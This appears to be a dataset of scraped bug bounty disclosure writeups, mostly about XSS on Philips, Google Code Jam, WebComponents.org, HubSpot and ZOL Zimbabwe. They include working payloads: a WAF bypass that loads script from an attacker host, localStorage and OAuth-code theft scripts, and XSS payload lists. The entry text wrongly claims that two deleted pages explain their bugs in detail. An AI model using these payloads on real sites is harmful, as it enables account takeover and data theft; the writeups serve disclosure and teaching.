“Triaged” [22–08–2018] Additional information sent and asked about process [23–08–2018] Reply from Uber:”Thanks @mefkan ! We have passed this information along to the internal team.” [27–08–2018] Vulnerability fixed [30–08–2018] Bounty awarded $2,000 [03–04–2018] Limited disclosure on Hackerone Takeaways 1-Don’t say “This a very known URL,no need to check it for vulnerabilities”.I can guarentee you that you missed a lot of bugs. 2-Always check out for others write-ups,particularly if you’re looking for something special or something detailed.Give your hours for only reading and understanding the logic behind. 3-Never give up,try your best,do your best,you will get what you want at the end. The End It was my first write-up folks and as I said I’ll publish another write-up every week.So don’t forget to follow me on Twitter,feel free to share your thoughts or questions with me,and I hope this helps to people like me to improve themselves. Thank you for reading ! Xss Xss Vulnerability Uber Bug Bounty Uber Partners -- -- 7 Written by Efkan 389 followers · 4 following BB ❤ https://twitter.com/mefkansec Responses ( 7 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@0ktavandi/how-i-bypassed-akamai-kona-waf-xss-in-overstock-com-f205b0e71a0d", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@0ktavandi/how-i-bypassed-akamai-kona-waf-xss-in-overstock-com-f205b0e71a0d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://websecblog.com/vulns/stored-xss-in-webcomponents-org/", "title": "Liking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org - Web Security Blog", "friendly_explanation": "This is a bug bounty writeup from https://websecblog.com/vulns/stored-xss-in-webcomponents-org/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nLiking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org - Web Security Blog Skip to content (Press Enter) Web Security Blog Thomas Orlita’s blog About Me About Me Liking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org by Thomas Orlita Vulnerabilities August 23, 2018 February 16, 2022 Video: Steps to reproduce: 1. Create a Polymer element and publish it to github 2. Set the repo homepage URL to: javascript:alert(document.domain) 3. Publish it via https://www.webcomponents.org/publish 4. Go to the element’s webcomponents.org page and click the homepage link What you can do with this XSS: If the user has authenticated using Github on webcomponents.org before, it’s possible to get the Github auth code and use it to star any public Github repo behalf of the user. It would work like this: Create an iframe with the GitHub auth URL. If the user is already authenticated, it redirects us to webcomponents.org . It will have the auth code in the url as ?code=123 (and we can access the iframe because it’s same origin). Use the code to post a request to webcomponents.org ‘s API to star any GitHub repository using the user’s account Here’s an example: // create an iframe with github authorization url // that redirects us back to webcomponents.org var iframe; iframe = document.createElement('iframe'); iframe.src = 'https://github.com/login/oauth/authorize?client_id=54fc42e15038794b7011&scope=public_repo&redirect_uri=https://www.webcomponents.org/element/ThomasOrlita/test2'; iframe.style.display = 'none'; document.body.appendChild(iframe); // just wait some time until it's loaded and redirected setTimeout(() => { console.log(iframe.contentWindow.location.href); // get the url that contains the authorization code from the iframe var url = new URL(iframe.contentWindow.location.href); var code = url.searchParams.get(\"code\"); // the github repo we want to star var repo_to_star = 'kelseyhightower/nocode'; // make a post request using the code fetch('/api/star/' + repo_to_star + '?code=' + code, { method: 'POST' }) }, 5000); Timeline 2018-08-12 Vulnerability reported 2018-08-17 Added more info 2018-08-20 Nice catch 2018-08-22 Fixed 2018-08-29 Reward issued Written by Thomas Orlita Follow me on Twitter: @ThomasOrlita / Mastodon: @ThomasOrlita@infosec.exchange Post Navigation Previuos Article Previous Article: Angular XSS vulnerability on McDonalds.com Next Article Reflected XSS in Google Code Jam Related Articles Bypassing Firebase authorization to create custom app.goo.gl subdomains by Thomas Orlita in Vulnerabilities How to use Google’s CSP Evaluator to bypass CSP by Thomas Orlita in Vulnerabilities Inserting arbitrary files into anyone’s Google Earth Studio Projects Archive by Thomas Orlita in Vulnerabilities 5 Different Vulnerabilities in Google’s Threadit by Thomas Orlita in Vulnerabilities Leave a Reply Cancel reply You must be logged in to post a comment. Web Security Blog by Thomas Orlita Digital Download | Developed by Rara Theme . Powered by WordPress ."}
{"source_url": "https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c", "title": "Reflected XSS at Philips.com. A full write-up; reflected XSS was… | by Jonathan Bouman | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS at Philips.com. A full write-up; reflected XSS was… | by Jonathan Bouman | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Press enter or click to view image in full size Proof of concept Reflected XSS at Philips.com Jonathan Bouman 8 min read · Sep 17, 2018 -- 5 Listen Share Are you aware of any (private) bug bounty programs? I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl Background As we learned from previous reports, XSS attacks can have a high impact ; you are able to steal cookies , attack the browser of a visitor or use it to phish for login credentials . Today we will learn more about a reflected XSS attack in Adobe Experience Manager (AEM) that bypasses the Web Application Firewall (WAF), it results in a fully working phishing login. Philips As always, we need to find a proper target for our attack. What about Philips ? This year they won an award for being “The most reputable company in the Netherlands” . Customers trust their brand and this makes them a high profile target for phishers. Press enter or click to view image in full size Winning the award for the eleventh year in a row Furthermore they’ve got a proper Responsible Disclosure , so we’re safe to help them. It’s time to claim our Hall of Honors mention! Reconnaissance , finding attack vectors Where do we start if we want to find a XSS bug? No strict rules. I always start with Aquatone in order to discover interesting subdomains, see this report for details. After that I start Burp Suite , see this report , and I start looking around for bugs! Press enter or click to view image in full size Add philips to the target scope, use .* as a joker to capture every philips hostname Press enter or click to view image in full size Example of a site map, you may send a request to the repeater to test it for XSS While clicking around the website, Burp Suite captures all the requests and responses. Burp Suite has a nice feature that creates a site map out of this data. This gives us a quick insight in how the website is structured, it also allows us to easily repeat specific requests and check if a page is vulnerable to XSS attacks. The principle of XSS is that we manipulate input variables (i.e. the website url or form fields) so we are able to inject our own HTML code into our targets website. Due to that we are able to inject some javascript code that changes the layout; for example into a phishing login. The URL is an important attack vector . If parts of the URL got reflected in the page response, without being escaped , we have a potential reflected XSS bug. Another important thing is to check if we are able to add HTML data to the website that persists in some database; a stored XSS. Press enter or click to view image in full size OWASP XSS Prevention cheat sheet, Rule #1: escape everything. Long story short, after a few hours of trying I did not find any reflective or stored attack vectors . I probed all the different parameters in the URLs captured by the Burp Suite; all of them were properly escaped . Good job Philips :-). Below you see an example of a manipulated request that tries to inject <h1>Hi mom</h1> into the page. It got escaped into &lt;h1&gt;Hi+mom&lt;/h1&gt; so the browser won’t try to render it as HTML, just as plain text. Press enter or click to view image in full size Example of a properly escaped variable used in the response. What to do now? Find holes in the server framework itself! To discover which framework is being used by Philips we may use tools like WhatCMS.org . They have created an algorithm that is able to detect 320 different CMS systems ; perfect! Press enter or click to view image in full size Adobe Experience Manager wins the battle. Another way to discover the name of the framework is by taking a closer look at the source code of the main page: Code that refers to adobedtm.com Press enter or click to view image in full size Adobe DTM is part of Adobe Experience Cloud, Adobe Experience Manager is the CMS. Now we know that Adobe Experience Manager (AEM) is used we should start reading as much as possible about this CMS. This gives us some feeling of where to look for the weak spots; what are the best practices, any security updates in the past and are there any hidden functions? Adobe Experience Manager Reading software documentation is a necessity, sometimes boring but often rewarding. Another thing you should always try is to just google on the software and look for blogs or other places where experts share their tricks. We discover something interesting if we do a quick google search for URL parameters. Press enter or click to view image in full size The first hit. Press enter or click to view image in full size A debug parameter exists, it outputs the ‘layout information’ of components. Thanks Feike for sharing! Press enter or click to view image in full size This parameter does exists in the official documentation, they recommend to disable it in production. Adobe even provided a AEM pen testing cheatsheet for us, thanks again! What happens if we visit Philips their website with the /?debug=layout parameter? Press enter or click to view image in full size Woops, they forgot to disable the debug mode. Does the debug mode renders our URL in the page, unescaped ? Press enter or click to view image in full size The URL is being parsed in the page, the URL path is not escaped so we are able to inject HTML! Yes it does! Let’s try some javascript . Press enter or click to view image in full size Mmm. Some WAF is blocking our request. Bypassing the Web Application Firewall (WAF) So we have our point of injection, the URL path combined with the debug=layout parameter. Now we need to find a piece of HTML that bypasses the firewall and executes our javascript. Identify the WAF A quick way to indentify the WAF(s) used by a target is to use WhatWaf . It probes the target with some payloads and compares the outcome with a set of detection rules. Press enter or click to view image in full size Output of WhatWaf if we check www.Philips.com The used WAF is ModSecurity and AkamaiGHost . Bypass ModSecurity and AkamaiGHost This is something I prefer to do by hand. Brute forcing it with the Burp Suite Intruder is possible, but hammering a server with plenty of requests is a bad idea; you will end up on some blacklist. While drinking a good cup of tea we discover that: 1. The WAF blocks the <script> tag 2. The WAF allows the <body> tag 3. The WAF blocks almost all the javascript events (i.e. onerror , onload , onmouseout ), but allows the use of the onpointerenter event. 4. The WAF blocks the string https:// in the path I always check if jQuery is loaded on the page; it allows us to create a smaller payload that works crossbrowser (by using the getScript function). Press enter or click to view image in full size Just run jQuery.fn.jquery in the console. jQuery is loaded if you see a version number. Now it’s time to construct our payload: https://www.philips.nl/healthcare/<body onpointerenter=\"jQuery.getScript('https:/' +'/attackerserver.ltd/philips/inject.js')\">?debug=layout We inject a body tag, that triggers the jQuery getScript function when someone moves their cursor over the page. The getScript function loads our external javascript file and executes the content. We use the 'https:/' +'/attackerserver.ltd' in order to bypass the WAF https:// string filter. We urlencode the payload in order to be sure that the link is valid and easy to send to our victim. Working payload https://www.philips.nl/healthcare/%3Cbody%20onpointerenter=%22jQuery.getScript('https:/'+'/attackerserver.ltd/philips/inject.js')%22%3E?debug=layout Creating a proper proof of concept Everyone knows the <script>alert('XSS')</script> payload as a proof of concept. However we will invest a few more minutes in making a more impressive proof of concept; a fully working phishing login . This is a better way to show the impact to people, everyone understands the impact if they see a fake login screen. In an upcoming report I will explain in detail how to create a proof of concept phishing login within a few minutes. Subscribe to my Twitter or Medium to get updates of any new posts ;-) Bonus: Stealing user details from logged in users Philips uses Janrain for their customer login. Janrain stores the user details in the localstorage of the browser. So we are able to steal the visitor details if one is logged in. Press enter or click to view image in full size Visitor details stored by Janrain in the localstorage This line of javascript is enough to steal the user details of a logged in user: var user = (localStorage.getItem(\"janrainCaptureProfileData\")) ? localStorage.getItem(\"janrainCaptureProfileData\") : \"Not logged in\"; Proof of concept in action Press enter or click to view image in full size Bypassing initial fix The initial fix of Philips was to add a new firewall rule that blocks all the HTML tags. Leaving the debug mode on. However we are able to inject a HTML tag that is missing the > character. https://www.philips.nl/healthcare/ <body%20alt=al%20lang=ert%20onmouseenter=\"top['al'+lang](/PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman/)\"?debug=layout Press enter or click to view image in full size Example of the bypass on lightning.philips.com The server will inject the payload and as you can see the > from the <br> tag will be used to close the body tag. Another nifty trick to bypass a WAF rule that blocks alert() strings: split the string into 2 pieces and add them as attributes to the HTML tag and merge them again in the same tag by using top[attribute1+attribute2] . Solutions The most simple solution is to disable the debug mode; this can be done by configuring the dispatcher used by AEM. The WAF may be improved to disable any the HTML tags in the url or onevent strings, however blacklisting is never a good solution; we will always find a new payload that bypasses the blacklist. Impact of the attack Extra filtration of user information visiting our prepared link Attack the browser of visitors through injection of a framework like beefproject.com Setting up a phishing login Hall of Honors Press enter or click to view image in full size A mention in the Hall of Honors of Philips :-) Timeline 13–07–18 Discovered bug, informed Philips by email 17–07–18 Asked Philips on Facebook Messenger if they received the report 17–07–18 Philips replied email that they received the report 17–07–18 Requested Philips to share the findings with the lighting.philips.com development team, this site is also vulnerable (Signify is the owner of Lighting Philips, a separate company. They share the Philips.com code base but have their own deployment and dev team). 26–07–18 Requested Philips for update, check if they informed Signify 30–07–18 Philips informs me that they deployed a fix on their own site, want to mention me in the Halls of Honors. No answer on Signify question. 30–07–18 Informed Philips that their fix (WAF rule) is not enough, debug mode still possible. 31–07–18 Created new payload that bypasses the new WAF rule, informed Philips. 18–08–18 Requested update; Philips.com looks fixed (no debug mode anymore), lightning.philips.com still vulnerable to both payloads 27–08–18 Requested update from Philips again, no response. 27–08–18 Requested email address of Signify IT Security Manager from a personal contact working at Signify/Philips Lighting. Informed Signify IT Security Manager by email. 28–08–18 Signify confirmed the bug 29–08–18 Philips informed me that they sent the report to the Lighting division but did not receive any response. 06–09–18 Wrote this report, requested update from Signify 07–09–18 Signify informed me that they are busy with the fix 13–09–18 Signify informed me that the fix is deployed, I confirmed the fix, requested to disclose on 17–09–18 16–09–18 Philips informed me that they have no remarks 17–09–18 Published this blog. Bug Bounty Security Hacker Web Development Ethical Hacking -- -- 5 Written by Jonathan Bouman 2.6K followers · 38 following Medical doctor / Web developer / Security researcher - https://Protozoan.nl Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@nandwanajatin25/my-first-valid-xss-hackerone-f8ba0a7c647", "title": "My first valid xss(@Hackerone). Hey today I will share my first ever… | by Jatin Nandwana | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nandwanajatin25/my-first-valid-xss-hackerone-f8ba0a7c647. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMy first valid xss(@Hackerone). Hey today I will share my first ever… | by Jatin Nandwana | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in My first valid xss(@Hackerone) Jatin Nandwana 2 min read · Aug 25, 2018 -- 1 Listen Share Hey today I will share my first ever valid xss bug which was a reflected xss on a public program on hackerone. So lets start, I was very new to hackerone and I took a random program to start and I started to do some recon by finding the subdomains and different endpoints.When I was looking at different pages inside the website and then I found an endpoint like this: https://example.com/abc/] I thought there is something fishy here and I opened that page but the page loaded normally.Then I looked at the source of the page and at last of the source I founded a commented out string containing the path after the domain. So I tried entering something else in the url path and it displayed as it is in that comment.So I tried closing that comment with a closing comment tag — —><test> and I was successful in closing that comment tag and was successful in inserting other tags so I insert a script tag after that so the final payload become https://example.com/abc/]--><script>alert(1)</script> and boom! xss executed! So in this way I was able to execute xss on that page.Later I realised that this was on every page of that domain and every path of that particular domain had a commented out string containing whatever in the url path was, so xss was executing on every page of that domain. Reported : 26/05/2018 Bounty : $100 Thanks for reading! I will post my more interesting findings here. Security Bug Bounty Pentesting Infosec Xss Attack -- -- 1 Written by Jatin Nandwana 131 followers · 1 following Web application pentester Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@rahulraveendran06/weaponizing-xss-attacking-internal-domains-d8ba1cbd106d", "title": "Weaponizing XSS Attacking Internal System | by Rahul R | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@rahulraveendran06/weaponizing-xss-attacking-internal-domains-d8ba1cbd106d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nWeaponizing XSS Attacking Internal System | by Rahul R | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Weaponizing XSS Attacking Internal System Rahul R 3 min read · Sep 25, 2018 -- 1 Listen Share Courtesy of BruteLogic ❤ Few week ago I was talking to a friend of mine when he gave me a subdomain that had an admin panel and asked me weather I could find a way to get inside, Why not give it a try. So I stared my recon by doing Directory Scanning , Checking SQL injections , Checking if there is some vulnerable libraries and finally Shit but I was curious to know more about it and I went to GOOGLE and searched for the company and gathered more info about the company even gave a connection request to the CTO via LinkedIn (we will get to the CTO in a minute) While looking at the company website I saw a support panel where I can submit tickets somewhere in my head I was having a voice saying its vulnerable and I should test it. Hmm May be a Blind XSS so i went to my XSSHunter account and copied the payload and submitted the request I never had any hope of having a successful execution but the next day I logged in to my account to check if it was executed and BOOM . I was able to grab the cookie of the user which I was able to impersonate and gain a valid session Boom inside Internal System. Press enter or click to view image in full size I registered an new account and submitted a Responsible Disclosure After a Day I was greeted with one of the best messages that Ive ever got Press enter or click to view image in full size Press enter or click to view image in full size This mail was actually by the CTO of the company a really cool guy who rewarded me for my finding, Security Bug Bounty Cybersecurity -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Rahul R 501 followers · 97 following Security NOOB :) Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://websecblog.com/vulns/reflected-xss-in-google-code-jam/", "title": "Reflected XSS in Google Code Jam - Web Security Blog", "friendly_explanation": "This is a bug bounty writeup from https://websecblog.com/vulns/reflected-xss-in-google-code-jam/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS in Google Code Jam - Web Security Blog Skip to content (Press Enter) Web Security Blog Thomas Orlita’s blog About Me About Me Reflected XSS in Google Code Jam by Thomas Orlita Vulnerabilities September 8, 2018 February 16, 2022 Information about this XSS: The XSS will be fired in the toast message. Also, it seems like you have to open the homepage ( https://codejam.withgoogle.com/2018/challenges/ ) at least once before visiting other pages there. POC: https://codejam.withgoogle.com/2018/challenges/0000000000007766/scoreboard/for/ %3Cimg%20src=x%20onerror=alert(document.domain)%3E CSP: Due to CSP, this XSS will fire only in browsers where CSP is not supported (e.g. IE). If we could somehow find a way to execute a script that has inserted dynamically, we could bypass (thanks to gstatic.com ) the CSP using the following payload. But I don’t think it’s possible in this case. <script src=\"https://www.gstatic.com/fsn/angular_js-bundle1.js\"></script> <div ng-app ng-csp id=p ng-click=$event.view.alert(1)> Read more about bypassing CSP in my other post . Attack scenario: Attacker can get access to the victim’s CodeJam account and read and edit their profile information (address, phone number, etc.). Here’s an example of how it could be done: // go to profile page document.querySelector('[href=\"/2018/profile\"]').click(); setTimeout(function() { // change the username document.querySelector('#nickname').value = 'mynickname111'; // create a fake input event to enable the submit button var event = document.createEvent(\"Event\"); event.initEvent('input', false, true); document.querySelector('#nickname').dispatchEvent(event); // submit the form document.querySelector('[type=\"submit\"]').click(); }, 1000); Timeline 2018-08-29 Vulnerability reported 2018-08-30 Priority changed to P2 2018-08-30 Nice catch 2018-09-05 Reward issued 2018-09-16 Fixed Written by Thomas Orlita Follow me on Twitter: @ThomasOrlita / Mastodon: @ThomasOrlita@infosec.exchange Post Navigation Previuos Article Previous Article: Liking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org Next Article How to use Google’s CSP Evaluator to bypass CSP Related Articles XSSing Google Code-in thanks to improperly escaped JSON data by Thomas Orlita in Vulnerabilities Inserting arbitrary files into anyone’s Google Earth Studio Projects Archive by Thomas Orlita in Vulnerabilities Bypassing Firebase authorization to create custom app.goo.gl subdomains by Thomas Orlita in Vulnerabilities Clickjacking DOM XSS on Google.org by Thomas Orlita in Vulnerabilities Web Security Blog by Thomas Orlita Digital Download | Developed by Rara Theme . Powered by WordPress ."}
{"source_url": "https://blog.securitybreached.org/2018/09/09/zol-zimbabwe-authbypass-sqli-xss/", "title": "ZOL Zimbabwe Authentication Bypass to XSS & SQLi Vulnerability - Bug Bounty POC - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2018/09/09/zol-zimbabwe-authbypass-sqli-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nZOL Zimbabwe Authentication Bypass to XSS & SQLi Vulnerability - Bug Bounty POC - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty September 9, 2018 Share BugBounty POC 1 ZOL Zimbabwe Authentication Bypass to XSS & SQLi Vulnerability – Bug Bounty POC by MuhammadKhizerJaved Hey Guys! Me Back with a New Post This One is about an Authentication Bypass Vulnerability in one of the subdomains of https://zol.co.zw/ ZOL Zimbabwe and Then got an XSS following with an SQLi in that Control Panel. So The Main Focus of this Blog Post will be on How i got access to the CP and then How i Got the XSS Following the SQLi So fast Forward I got a Subdomain of the site that was http://psizimll2.zol.co.zw/ and the Subdomain was Showing the Default IIS7 Page Like in the Picture Below So At First I started testing this Subdomain for 2 Of the Most Common issues Found in IIS7 1) Microsoft IIS Tilde Vulnerability (And the Site was Vulnerable to this issue) 2) HTTP.sys DOS & possible RCE but after testing these Common Issues on the subdomain i got nothing and decided to dig deeper. So i searched the subdomain on Google to see if there is any information about this particular subdomain (Most of the time a simple google search gives you some files or folders ) But negative i got nothing i did go through virustotal & Some other webs like web archive to get some information but nothing. After this the next phase of my testing was to use DirBuster & DirScanner to test Further for any possible Files/Folders and after a while i got Some URLs Like http://psizimll2.zol.co.zw/test.php http://psizimll2.zol.co.zw/info.php http://psizimll2.zol.co.zw/cp.php The 2 Pages test.php and info.php were both leaking Some Information Through phpinfo(); Pages So At this Point i had 2 Issues in that Subdomain…. Now When Ever I went to the URL http://psizimll2.zol.co.zw/cp.php i got redirected to the main page of the subdomain that was http://psizimll2.zol.co.zw/ So as Many of you guys know about some redirect based techniques, Like This NoRedirect one i added the URL cp.php to the FireFox Extension called NoRedirect and Then When i went to the URL http://psizimll2.zol.co.zw/cp.php it did;t redirected me to http://psizimll2.zol.co.zw/ and i had Access to http://psizimll2.zol.co.zw/cp.php that looked like a Control Panel for some sort of webapp that have some users data in it. Now I searched for Some Data and it was a User Information Database of some sort while searching In It I got another Page that was http://psizimll2.zol.co.zw/dnpc.php and this Page got data of users function where i can search user data from particular dates while searching a POST request was send to the file /dnpc.php with post data as Submit2=Go&end_dt1&start_dt=10 And I saw that the anything that we add to the perimeters end_dt or start_dt was reflecting back in the page under a <th></th> tag so i added a simple Image XSS Payload and it was reflected to me under the <th></th> tag and the XSS payload was executed And I would Like to Mention That due to some error the Search Input was Saved on this Page so It became a Stored XSS 🤣 Now It was getting Bored So i Decided to Write the Report to the team and suddenly decided to look for One last issue that can make the report look better So at the same Endpoints in the same POST request as Above i simply changed searched for 1′ Submit2=Go&end_dt1&start_dt=10 as I started looking for an SQL Injection Issue aND boom the Response for this request gave me an Error Could not get htccc data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”’ at line 1 And So I did Exploit this issue to Get the Basic Info and Tables and then i was Convinced i should Stop Further Tests on this Subdomain and Report the issue Furthermore the ZOL team Patched these Issues by Deleting files and Blocking access to the Subdomain 👏 Thanks for Reading this guys 🙂 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: Authentication Bypass SQL Injection XSS MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X One reply on “ZOL Zimbabwe Authentication Bypass to XSS & SQLi Vulnerability – Bug Bounty POC” These Bug Bounty Writeups will Change Your Life - PrimeHackers says: June 26, 2020 at 7:19 am […] Authbypass SQLi and XSS […] Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next Authentication Bypass Using SQL Injection AutoTrader Webmail – Bug Bounty POC Previous SQL Injection Vulnerability bootcamp.nutanix.com | Bug Bounty POC You may also like April 19, 2023 by MuhammadKhizerJaved How I Manipulated My Rank on the Bugcrowd Platform This vulnerability on the Bugcrowd platform allowed manipulating rank on the platform using the API. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials 0 Read More June 30, 2020 by MuhammadKhizerJaved Using Inspect Element to Bypass Security restrictions | Bug Bounty POC Hey guys so this blog post is about bug bounty report, I was able to Bypass Security restrictions by using inspect element and use Paid Features. About the Issue: The... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials 4 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://medium.com/@musabalhussein/icloud-com-dom-based-xss-bugbounty-6f88cb865b18", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@musabalhussein/icloud-com-dom-based-xss-bugbounty-6f88cb865b18. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@friendly_/xss-at-hubspot-and-xss-in-email-areas-674fa39d5248", "title": "XSS at Hubspot and XSS in email areas. | by Friendly | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@friendly_/xss-at-hubspot-and-xss-in-email-areas-674fa39d5248. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS at Hubspot and XSS in email areas. | by Friendly | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XSS at Hubspot and XSS in email areas. Friendly 5 min read · Aug 13, 2018 -- 4 Listen Share For those asking me what this Tweet and this Tweet is about — then I will be explaining it here in details as much as possible. For this XSS, you’d want to have Kali Linux, KNOXSS, a SVG that contains an XSS and the basic understanding of how email rendering is displayed on users, admins and client side in email, ticket supports and on the web page. If you do not have an SVG that contains an XSS, then I’d highly recommend you use the one I will provide: Make a file name called: SVG.svg — then edit the file name and paste the following code inside of it and then save it: <svg version=\"1.1\" baseProfile=\"full\" xmlns=\" http://www.w3.org/2000/svg \"> <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/> <script type=\"text/javascript\"> alert('XSS!'); </script> </svg> Very basic stuff. [Well done, you have an SVG that contains an XSS!] Steps to Reproduce: First XSS is from https://bugcrowd.com/hubspot — although they only reward points and hall of fame. Even though this isn’t something you guys care about other than the 💰 [money], but this is a good stepping stone to learn about security. To do this you’d need an account on: http://hubspot.com to test on. First, we go to https://app.hubspot.com and then edit our signature: First thing I do and see is an input field. I tried my very basic payloads, which are: \"><svg/onload=alert(1)> <img>/><svg/onload=alert(1)> \"></\\/\\</script><script>alert(1)</script> \"><script>alert(\"xss\");</script> <div onmouseover=\"alert('XSS');\">Hello :) ^ [My favorite one - works like 80% of the time for me]. </style><script>a=eval;b=alert;a(b(/XSS/.source));</script> That's all for now that I'll share. Enjoy the payloads too. ;) However, NONE of them worked sadly in this case and on this website. 😦 I did notice that were was an IMAGE icon there though. So I clicked it and saw my SVG being visible, and was able to being uploaded. I clicked my SVG and uploaded it. The SVG was then uploaded directly to the server and wasn’t filtered at all. So I went to the direct link where my IMAGE SVG was and we got our XSS. Awesome. SVGXSS — Nice. 😁 Some of you may stop here — However, I didn’t stop here. I wanted to go a step beyond that a step further and maybe do more for a bigger impact. This other step: “Requires” Kali Linux [You can skip this part if you’re not interested in Kali Linux]. I booted up Kali Linux and then I created a file name: \"><svg onload=alert(1)>.svg Then I put my XSS inside of it and saved it. After doing that, I uploaded it on the server. The file name did not change at all on the location it was being uploaded to. However, I didn’t get my XSS. So I changed the file name to: \"><svg onmouseover=alert(1)>.svg Then I hovered over it and BAM. 😉 Press enter or click to view image in full size Successfully got the mighty confirmation alert 1. Now, if we visit that file link itself — we should get our confirmation. Press enter or click to view image in full size Our magical confirmation alert— “Friendly”. Ha. And that being included, it shows our SVG. So if you’d right click “Open image in new tab”, you will be taken to the SVG which contains our XSS as well. [ Thanks again KNOXSS here for providing insight, a powerful payload and bypass. ] Basically, TWO XSS in one page. Reward: Points. — Yuck. Finally, XSS via chat module with an email XSS. This method was discovered by me [ Friendly ] and it works 70% of the times from the websites I’ve come across in my last 24–72 hours when I was testing with numerous websites with various chatting module systems like this one. POC: Press enter or click to view image in full size Our beautiful XSS. [ The black box is just covering the website I’m chatting on. ] I tried sending the payload itself without going to the email area, but unfortunately I got no XSS. So I’ll explain why it works this way with some live support chat modules. If this makes any form of sense to you, or helps you in the long run, then be sure to let me know on Twitter by Tweeting at me. The main question is, why does it work like that and how does it work? It’s quite simple. As soon as you input a payload inside the email field such as: x@x.com<--`<img/src=` onerror=alert(\"Friendly-XSS\")> --!> or <--`<img/src=` onerror=alert(\"Friendly-XSS\")> --!> then send another payload similar to it will automatically register on the admins side which will then execute. HOWEVER! It will show it’s not registering on your side which is fine, so that means you will need to send the same payload in order for it to execute. POC is provided above and on what this means. The site Hubspot did NOT reward me for this, however a private Freelancing website did and I grateful for the 